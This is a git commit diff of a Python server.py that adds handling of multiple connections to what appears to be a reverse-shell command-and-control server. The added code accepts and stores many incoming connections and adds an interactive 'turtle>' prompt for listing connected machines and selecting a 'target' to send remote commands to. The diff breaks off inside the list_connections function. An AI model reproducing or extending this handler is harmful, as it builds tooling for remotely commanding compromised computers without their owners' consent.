6c250af8ad3e62be9ec8ef044cc337f9f51bd0ff
Юлиан Василев Дашев <uliandashev09@gmail.com>
2022-03-29 17:49:38 +0300

    Handling multiple connections part 1

--- server.py
+++ server.py
@@ -1,5 +1,13 @@
 import socket
+import threading
 import sys
+from queue import Queue
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_addresses = []
 
 
 # Create socket (allows connection between two computers)
@@ -30,11 +38,39 @@ def socket_bind():
 
 
 # Establish a connection with client (socket must be listening for them)
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
-    send_commands(conn)
-    conn.close()
+def accept_connections():
+    for c in all_connections:
+        c.close()
+    del all_connections[:]
+    del all_addresses[:]
+    while 1:
+        try:
+            conn, address = s.accept()
+            conn.setblocking(1)
+            all_connections.append(conn)
+            all_addresses.append(address)
+            print("Connection has been established | " + "IP: " + address[0] + " | Port: " + str(address[1]))
+        except:
+            print("Error accepting connections")
+
+
+# Interactive prompt for sending commands remotely
+def start_turtle():
+    while True:
+        cmd = input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print("Command not recognized")
+
+# Display all current connections
+def list_connections():
+    results = ''
+    for i, conn in enumerate(all_connections):
 
 
 # Send commands to the target machine
